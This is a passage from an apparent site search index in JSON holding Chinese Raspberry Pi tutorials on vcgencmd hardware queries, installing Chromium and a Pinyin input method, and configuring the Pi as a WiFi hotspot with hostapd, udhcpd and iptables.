59:00000000 60:00000000 61:00000000 62:00000000 63:00000000 64:00000000` \u5176\u4e2d 28 \u8207 30 \u4ee3\u8868\u786c\u9ad4\u5e8f\u865f\uff08serial\uff09\u8207\u4fee\u8a02\u7248\uff08revision\uff09\u7684\u7248\u672c\u865f\u78bc\uff0c /proc/cpuinfo \u4e2d\u6240\u986f\u793a\u7684\u5e8f\u865f\u8207\u4fee\u8a02\u7248\u672c\u865f\u78bc\u5c31\u662f\u5f9e\u9019\u88e1\u53d6\u5f97\u7684\uff0c\u800c Model B/B+ \u7684\u7db2\u8def\u5361 MAC \u5361\u865f\u4e5f\u662f\u6839\u64da\u786c\u9ad4\u5e8f\u865f\u4f86\u7522\u751f\u7684\u3002","title":"OTP \u8a18\u61b6\u9ad4"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#vcgencmd","text":"\u5982\u679c\u8981\u67e5\u770b vcgencmd \u6307\u4ee4\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd commands \u8f38\u51fa\u6703\u985e\u4f3c\u9019\u6a23\uff1a commands=\u201dvcos, ap_output_control, ap_output_post_processing, vchi_test_init, vchi_test_exit, pm_set_policy, pm_get_status, pm_show_stats, pm_start_logging, pm_stop_logging, version, commands, set_vll_dir, led_control, set_backlight, set_logging, get_lcd_info, set_bus_arbiter_mode, cache_flush, otp_dump, test_result, codec_enabled, get_camera, get_mem, measure_clock, measure_volts, scaling_kernel, measure_temp, get_config, hdmi_ntsc_freqs, hdmi_adjust_clock, hdmi_status_show, hvs_update_fields, pwm_speedup, force_audio, hdmi_stream_channels, hdmi_channel_map, display_power, read_ring_osc, memtest, get_rsts, render_bar, disk_notify, inuse_notify, sus_suspend, sus_status, sus_is_enabled, sus_stop_test_thread, egl_platform_switch, mem_validate, mem_oom, mem_reloc_stats, file, vctest_memmap, vctest_start, vctest_stop, vctest_set, vctest_get\u201d \u9019\u4e9b\u5c31\u662f\u6240\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u53c3\u6578\uff0c\u9019\u4e9b\u53c3\u6578\u6703\u56e0\u70ba\u97cc\u9ad4\u7248\u672c\u4e0d\u540c\u800c\u6709\u5dee\u7570\u3002 \u5982\u679c\u60a8\u5c0d\u65bc\u6a39\u8393\u6d3e\u7684\u61c9\u7528\u6709\u8208\u8da3\uff0c\u5efa\u8b70\u60a8\u53ef\u4ee5\u7e7c\u7e8c\u95b1\u8b80 \u7269\u806f\u7db2 \u7684\u76f8\u95dc\u6587\u7ae0\u3002 \u53c3\u8003\u8cc7\u6599\uff1a Embedded Linux Wiki \u3001 raspberrypi.org \u3001 maketecheasier \u3001 lokir\u2019s linux notes (adsbygoogle = window.adsbygoogle || []).push({}); \u539f\u6587\u94fe\u63a5\uff1a https://blog.gtwang.org/iot/raspberry-pi-vcgencmd-hardware-information/","title":"\u67e5\u770b vcgencmd \u6240\u6709\u53ef\u7528\u7684\u53c3\u6578"},{"location":"RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/","text":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5 \u6811\u8393\u6d3e\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u8fd8\u8981\u88c5\u4e0a\u4e00\u4e9b\u5fc5\u987b\u7684\u7684\u5de5\u5177\u624d\u80fd\u7528\u554a\uff0c\u6bd4\u5982\u8bf4\u4e2d\u6587\u8f93\u5165\u6cd5\u548c\u6d4f\u89c8\u5668\u3002 Ubuntu Mate for Raspberry Pi 2 \u867d\u7136\u652f\u6301\u4e2d\u6587\uff0c\u4f46\u662f\u662f\u6ca1\u6709\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b89\u88c5\u4e00\u4e2a\u3002 \u6211\u5b89\u88c5\u4e86 Google \u62fc\u97f3\uff0c\u4e00\u4e2a\u547d\u4ee4\u5c31\u53ef\u4ee5\u88c5\u597d fcitx \u548c Google \u62fc\u97f3\u3002 sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin \u91cd\u542f\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\u8f93\u5165\u6cd5\u4e86\u3002\u8fd9\u7bc7\u7684\u4e1c\u897f\u5c31\u662f\u5728\u6811\u8393\u6d3e\u4e0a\u7528 Google \u62fc\u97f3\u6572\u51fa\u6765\u7684:) \u7cfb\u7edf\u81ea\u5e26\u7684\u662f FireFox\uff0c\u7528\u8d77\u6765\u4e5f\u8fd8\u633a\u6d41\u7545\uff0c\u4f46\u662f\u6211\u4e2a\u4eba\u4e60\u60ef\u7528 Chrome\uff0c\u4e8e\u662f\u6211\u5b89\u88c5\u4e86 Chromium \u6d4f\u89c8\u5668\u3002 Ubuntu Mate \u81ea\u5e26\u7684\u6e90\u91cc\u662f\u6ca1\u6709 Chromium \u7684\uff0c\u4e8e\u662f\u6211\u4eec\u8981\u5148\u6dfb\u52a0\u4e00\u4e2a\u6e90\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002 sudo tee /etc/apt/sources.list.d/i386.list deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5 Chromium \u4e86\uff1a sudo apt-get install chromium \u539f\u6587\u94fe\u63a5\uff1a https://yian.me/blog/cs/install-chromium-and-google-pinyin-on-raspberry-pi-2.html","title":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5"},{"location":"RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/#2-chromium-google","text":"\u6811\u8393\u6d3e\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u8fd8\u8981\u88c5\u4e0a\u4e00\u4e9b\u5fc5\u987b\u7684\u7684\u5de5\u5177\u624d\u80fd\u7528\u554a\uff0c\u6bd4\u5982\u8bf4\u4e2d\u6587\u8f93\u5165\u6cd5\u548c\u6d4f\u89c8\u5668\u3002 Ubuntu Mate for Raspberry Pi 2 \u867d\u7136\u652f\u6301\u4e2d\u6587\uff0c\u4f46\u662f\u662f\u6ca1\u6709\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b89\u88c5\u4e00\u4e2a\u3002 \u6211\u5b89\u88c5\u4e86 Google \u62fc\u97f3\uff0c\u4e00\u4e2a\u547d\u4ee4\u5c31\u53ef\u4ee5\u88c5\u597d fcitx \u548c Google \u62fc\u97f3\u3002 sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin \u91cd\u542f\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\u8f93\u5165\u6cd5\u4e86\u3002\u8fd9\u7bc7\u7684\u4e1c\u897f\u5c31\u662f\u5728\u6811\u8393\u6d3e\u4e0a\u7528 Google \u62fc\u97f3\u6572\u51fa\u6765\u7684:) \u7cfb\u7edf\u81ea\u5e26\u7684\u662f FireFox\uff0c\u7528\u8d77\u6765\u4e5f\u8fd8\u633a\u6d41\u7545\uff0c\u4f46\u662f\u6211\u4e2a\u4eba\u4e60\u60ef\u7528 Chrome\uff0c\u4e8e\u662f\u6211\u5b89\u88c5\u4e86 Chromium \u6d4f\u89c8\u5668\u3002 Ubuntu Mate \u81ea\u5e26\u7684\u6e90\u91cc\u662f\u6ca1\u6709 Chromium \u7684\uff0c\u4e8e\u662f\u6211\u4eec\u8981\u5148\u6dfb\u52a0\u4e00\u4e2a\u6e90\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002 sudo tee /etc/apt/sources.list.d/i386.list deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5 Chromium \u4e86\uff1a sudo apt-get install chromium \u539f\u6587\u94fe\u63a5\uff1a https://yian.me/blog/cs/install-chromium-and-google-pinyin-on-raspberry-pi-2.html","title":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5"},{"location":"RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/","text":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247) \u63d0\u9192\uff1a \u672c\u9875\u9762\u5c06\u4e0d\u518d\u66f4\u65b0\u3001\u7ef4\u62a4\u6216\u8005\u652f\u6301\uff0c\u6587\u7ae0\u3001\u8bc4\u8bba\u6240\u53d9\u8ff0\u5185\u5bb9\u5b58\u5728\u65f6\u6548\u6027\uff0c\u6d89\u53ca\u6280\u672f\u7ec6\u8282\u6216\u8005\u8f6f\u4ef6\u4f7f\u7528\u65b9\u9762\u4e0d\u4fdd\u8bc1\u80fd\u591f\u5b8c\u5168\u6709\u6548\u53ef\u64cd\u4f5c\uff0c\u8bf7\u8c28\u614e\u53c2\u8003\uff01 \u6700\u8fd1\u53c8\u5f00\u59cb\u6298\u817e\u8d77Raspberry Pi\u6765\u4e86\uff0c\u56e0\u4e3a\u67d0\u5904\u4e0a\u7f51\u9700\u8981\u9510\u6377\u62e8\u53f7\uff0c\u4e8e\u662f\u6211\u5c31\u60f3\u80fd\u4e0d\u80fd\u8ba9\u6211\u7684\u6811\u8393\u6d3e\u4ee3\u52b3\uff0c\u5f53\u7136\u9996\u5148\u8981\u5c06\u5176\u6539\u9020\u4e3a\u8def\u7531\u5668\uff0c\u9ed8\u8ba4\u81ea\u5e26\u7684\u7f51\u53e3\u4f5c\u4e3aWAN\u53e3\uff0c\u6211\u4eec\u8fd8\u7f3a\u4e00\u4e2a\u7f51\u53e3\uff0c\u6728\u6709\u529e\u6cd5\uff0c\u53ea\u597d\u5360\u7528\u4e00\u4e2aUSB\u53e3\uff0c\u63a5\u4e0a\u4e00\u4e2aUSB\u7f51\u5361\uff0c\u7f51\u4e0a\u7684USB\u8f6cRJ45\u7f51\u7ebf\u53e3\u7684\u9002\u914d\u5668\u6bd4\u8f83\u5c11\uff0c\u4ef7\u683c\u4e5f\u4e0d\u4fbf\u5b9c\uff0c\u4e8e\u662f\u5c31\u8003\u8651\u5e72\u8106\u5c06\u5176\u6539\u9020\u6210\u65e0\u7ebf\u8def\u7531\uff0c\u4e5f\u7b26\u5408\u65f6\u4e0b\u9ad8\u7aef\u5927\u6c14\u4e0a\u6863\u6b21\u7684\u6807\u51c6\u3002 \u51c6\u5907\u5de5\u4f5c\uff0c\u5f53\u7136\u8981\u5148\u53bb\u8d2d\u4e70\u4e00\u4e2aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u8d2d\u4e70\u7684\u578b\u53f7\u6bd4\u8f83\u591a\uff0cRaspberry Pi\u5b98\u65b9\u4e5f\u63d0\u4f9b\u4e86 \u517c\u5bb9\u6027\u5217\u8868 \u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5177\u4f53\u731b\u51fb\u8fd9\u91cc\u3002\u6211\u8fd9\u91cc\u8d2d\u4e70\u7684\u662f \u7f51\u4ef6\uff08Netgear\uff09WNA1000M 150M\u8ff7\u4f60USB\u65e0\u7ebf\u7f51\u5361 \u3002 \u8f83\u4e3a\u5b98\u65b9\u7684\u4ecb\u7ecd\u914d\u7f6e\u4e3a\u65e0\u7ebf\u70ed\u70b9\u7684\u6587\u7ae0\u83ab\u8fc7\u4e8e\u8fd9\u4e00\u7bc7 \u300aRPI-Wireless-Hotspot\u300b \u3002\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u4e0b\u6765\u59cb\u7ec8\u65e0\u6cd5\u6210\u529f\u3002\u4f46\u662f\u65e0\u7ebf\u7f51\u5361\u786e\u5b9e\u80fd\u591f\u88ab\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7 lsusb \u548c lsmod \u67e5\u770b\u5230\uff0c\u4e0d\u8fc7\u6211\u6ce8\u610f\u5230\u8fd9\u6b3e\u65e0\u7ebf\u7684\u82af\u7247\u578b\u53f7\u662fRealTek RTL8188CUS\uff0c\u521d\u6b65\u6000\u7591\u662f\u9a71\u52a8\u95ee\u9898\u3002 \u5f53\u7136\u770b\u5230\u522b\u4eba\u7684\u8001\u6b3e\u65e0\u7ebf\u7f51\u5361\u90fd\u914d\u7f6e\u6210\u529f\u4e86\u5fc3\u91cc\u96be\u514d\u75d2\u75d2\u7684\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u518d\u6d6a\u8d39\u94f6\u5b50\u53bb\u518d\u4e70\u4e2a\u7f51\u5361\uff0c\u4e8e\u662f\u53ea\u597d\u81ea\u5df1\u6478\u7d22\uff0c\u4e0d\u8fc7\u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff0c\u5728N\u6b21\u5237\u673a\u91cd\u88c5\u7cfb\u7edf\u540e\uff0c\u7ec8\u4e8e\u627e\u5230\u4e86\u6210\u529f\u7684\u529e\u6cd5\uff0c\u5176\u5b9e\u5173\u952e\u7684\u6587\u7ae0\u5c31\u5728\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u7684\u4e00\u4e2a\u94fe\u63a5\u4e2d \u300aTurn Your Raspberry Pi Into a WiFi Hotspot with Edimax Nano USB EW-7811Un (RTL8188CUS chipset)\u300b \u3002 \u597d\u4e86\uff0c\u4e0b\u9762\u6211\u5c06\u5b9e\u8df5\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5f53\u7136 \u4e3b\u8981\u53c2\u8003\u4e86\u4e0a\u9762\u4e24\u7bc7\u6587\u7ae0 \uff0c\u8fd9\u91cc\u662f\u914d\u7f6e\u7684\u56de\u5fc6\uff0c\u6211\u5c3d\u91cf\u8bb0\u5f55\u8be6\u7ec6\uff0c\u9057\u6f0f\u4e4b\u5904\u671b\u6307\u51fa\u3002 1. \u5b89\u88c5\u7cfb\u7edf\uff08\u5982\u679c\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u53ef\u4ee5\u8df3\u8fc7\u8fd9\u4e00\u6b65\uff09 1.1 \u5c3d\u91cf\u4f7f\u7528\u6700\u65b0\u7cfb\u7edf\uff0c\u9996\u5148\u4e0b\u8f7d \u5b98\u65b9\u6700\u65b0\u955c\u50cf \uff0c\u7136\u540e\u4f7f\u7528 Win32DiskImager \u70e7\u5f55\u5230SD\u5361\u4e0a\u3002\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u7684\u662fRaspbian\u3002 1.2 Raspberry Pi\u8fde\u63a5\u4e0a\u65e0\u7ebf\u7f51\u5361\uff0c\u7136\u540e\u7cfb\u7edf\u955c\u50cf\u5237\u5165SD\u5361\u540e\uff0c\u6211\u4eec\u8fde\u63a5\u663e\u793a\u5668\u952e\u76d8\u548c\u9f20\u6807\u8fdb\u884c\u521d\u59cb\u5316\u914d\u7f6e\u5de5\u4f5c\uff0c\u5f53\u7136\u6ca1\u6709\u6761\u4ef6\u7684\u8bdd\u63a8\u8350\u76f4\u63a5\u4f7f\u7528SSH\u8fde\u63a5Raspberry Pi\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u65b0\u7cfb\u7edf\u9ed8\u8ba4\u5f00\u653e\u4e86SSH\u7ba1\u7406\u3002 \u8fde\u63a5\u4fe1\u606f\u4e3b\u8981\u5982\u4e0b\uff1a \u4e3b\u673a\u540d : raspberrypi \u7528\u6237\u540d : pi \u5bc6 \u7801 : raspberry \u5982\u679c\u4f60\u662f\u76f4\u63a5\u901a\u8fc7SSH\u8fde\u63a5\u5230Raspberry Pi\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u6b65\u9aa4\u662f\u5fc5\u8981\u7684\uff1a 1.2.1 \u521d\u59cb\u5316\u914d\u7f6e\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u53ea\u6709\u5728\u65b0\u5b89\u88c5\u7684\u7cfb\u7edf\u5185\u9700\u8981\uff0c\u4ec5\u505a\u4e00\u6b21\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u8fdb\u5165\u914d\u7f6e\u754c\u9762\uff1a sudo raspi-config \u63a8\u8350\u66f4\u65b0\u4e0b\u9762\u7684\u914d\u7f6e\u9009\u9879\uff08 \u65b0\u914d\u7f6e\u754c\u9762 \uff09\uff1a 1 Expand Filesystem 2 Change User Password 4 Internationalisation Options I1 Change Locale I2 Change Timezone 8 Advanced Options A3 Memory Split A6 Update \uff08 \u65e7\u914d\u7f6e\u754c\u9762 \uff09 update expand_rootfs change_pass change_timezone memory_split \u8fd9\u91cc\u8981\u6ce8\u610f Memory Split/memory_split \uff0c\u9ed8\u8ba4\u9884\u7559\u7ed9\u56fe\u5f62\u754c\u9762\u7684\u662f 64MB \uff0c\u4f5c\u4e3a\u4e00\u53f0\u65e0\u7ebf\u8def\u7531\u57fa\u672c\u4e0a\u5c31\u7528\u4e0d\u5230\u56fe\u5f62\u754c\u9762\u4e86\uff0c\u5f88\u663e\u7136 64MB \u7565\u6709\u5962\u4f88\uff0c\u6211\u4eec\u5c06\u5176\u6539\u6210 32MB \u3002 \u6700\u540e Finish \u5b8c\u6210\u521d\u59cb\u5316\u914d\u7f6e\u3002\u7cfb\u7edf\u4f1a\u81ea\u52a8\u63d0\u793a\u91cd\u542f\uff0c\u5982\u679c\u6ca1\u6709\u6309\u9884\u671f\u91cd\u542f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542f\u7cfb\u7edf\uff1a sudo shutdown -r now 2. \u5b89\u88c5hotspot(hostapd) sudo apt-get install bridge-utils hostapd hostapd\u5b9e\u73b0\u7684\u662f\u65e0\u7ebf\u5171\u4eab\uff0c \u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e0d\u517c\u5bb9RTL8188CUS\u82af\u7247\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u4e0d\u8fc7Edimax\u56e2\u961f\u4e3a\u6211\u4eec\u4e13\u95e8\u7f16\u8bd1\u4e86\u517c\u5bb9\u7684\u7248\u672c\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u9700\u8981\u66ff\u6362hostapd\u4e3a\u517c\u5bb9\u7248\u672c\u3002 \u66ff\u6362\u7684\u547d\u4ee4\u5982\u4e0b\uff1a wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip unzip hostapd.zip sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak sudo mv hostapd /usr/sbin/hostapd.edimax sudo ln -sf /usr/sbin/hostapd.edimax /usr/sbin/hostapd sudo chown root.root /usr/sbin/hostapd sudo chmod 755 /usr/sbin/hostapd \u63a5\u4e0b\u6765\u63d0\u4f9b\u4e24\u79cd\u65b9\u6848\uff0c\u4e00\u79cd\u662f\u6865\u63a5\u65b9\u5f0f\u8bbe\u7f6e\u70ed\u70b9\uff0c\u6709\u70b9\u7c7b\u4f3c\u4ea4\u6362\u673a\u5de5\u4f5c\u539f\u7406\uff0c\u5c06\u7f51\u7ebf\u53e3\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u65e0\u7ebf\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u662f\u8def\u7531\u65b9\u5f0f\u5b9e\u73b0\u65e0\u7ebf\u4e0a\u7f51\uff0c\u548c\u5927\u90e8\u5206\u8def\u7531\u5668\u5de5\u4f5c\u65b9\u5f0f\u4e00\u6837\u3002 3. \u6865\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e00\uff09 3.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install bridge-utils 3.2 \u914d\u7f6e\u7f51\u5361 \u7f16\u8f91\u7f51\u5361\u914d\u7f6e\u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #allow-hotplug wlan0 #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u52a0\u4e0a\u4e0b\u9762\u8fd9\u6bb5\u6865\u63a5\u914d\u7f6e\uff1a auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 \u6700\u7ec8\u7684\u914d\u7f6e\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a #loopback adapter auto lo iface lo inet loopback #wired adapter iface eth0 inet dhcp #bridge auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 3.3 \u914d\u7f6ehostapd sudo nano /etc/hostapd/hostapd.conf \u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv bridge=br0 ssid=My_SSID_Name channel=1 wmm_enabled=0 wpa=1 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP auth_algs=1 macaddr_acl=0 \u914d\u7f6e\u6587\u4ef6\u5177\u4f53\u6211\u5c31\u4e0d\u8bf4\u4e86\uff0c\u60f3\u5fc5\u5927\u5bb6\u770b\u5185\u5bb9\u4e5f\u77e5\u9053\u5404\u9879\u7684\u542b\u4e49\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002 3.4 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" \u6865\u63a5\u65b9\u5f0f\u914d\u7f6e\u5b8c\u6210\uff01 4. \u8def\u7531\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e8c\uff09 4.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install udhcpd udhcpd\u4e3b\u8981\u4e3a\u8fde\u63a5\u5230WiFi\u7684\u8bbe\u5907\u81ea\u52a8\u5206\u914dIP\u5730\u5740\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6362\u7528\u4f60\u6240\u719f\u6089\u7684\u8f6f\u4ef6\u3002 4.2 \u914d\u7f6eudhcpd\uff0c\u7f16\u8f91 /etc/udhcpd.conf \uff0c\u4e3b\u8981\u5185\u5bb9\u5982\u4e0b\uff1a start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices. end 192.168.42.20 interface wlan0 # The device uDHCP listens on. remaining yes opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use. opt subnet 255.255.255.0 opt router 192.168.42.1 # The Pi's IP address on wlan0 which we will set up shortly. opt lease 864000 # 10 day DHCP lease time in seconds \u63a5\u4e0b\u6765\u7f16\u8f91 /etc/default/udhcpd \u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 4.3 \u914d\u7f6e\u65e0\u7ebf\u7f51\u5361 \u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u7ed9\u65e0\u7ebf\u7f51\u5361\u8bbe\u7f6e\u4e00\u4e2aIP\u5730\u5740\uff1a sudo ifconfig wlan0 192.168.42.1 \u5f53\u7136\u4e3a\u4e86\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u6709\u6548\uff0c\u6211\u4eec\u9700\u8981\u914d\u7f6e /etc/network/interfaces \u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u6ce8\u610f\u4fdd\u7559 allow-hotplug wlan0 \uff0c\u82f1\u6587\u539f\u6587\u662f\u4e0d\u4fdd\u7559\u7684\uff0c\u4f46\u662f\u6211\u64cd\u4f5c\u4e0b\u6765\u53d1\u73b0\u5982\u679c\u4e0d\u4fdd\u7559\u8fd9\u6bb5\u7684\u8bdd\uff0c\u65e0\u7ebf\u7f51\u5361\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u914d\u7f6eIP\uff0c\u6700\u540e\u65e0\u7ebf\u7f51\u5361IP\u7684\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a allow-hotplug wlan0 iface wlan0 inet static address 192.168.42.1 netmask 255.255.255.0 4.4 \u7f16\u8f91hostapd\u914d\u7f6e sudo nano /etc/hostapd/hostapd.conf \u5185\u5bb9\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv ssid=My_SSID_Name hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 4.7 \u542f\u52a8IP\u8f6c\u5411\u529f\u80fd\u4ee5\u4fbf\u4e8e\u5f00\u901aNAT sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" \u7f16\u8f91 /etc/sysctl.conf \u6539\u52a8\u4e0b\u9762\u8fd9\u884c\uff1a net.ipv4.ip_forward=1 4.8 \u914d\u7f6eiptables\u9632\u706b\u5899 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT 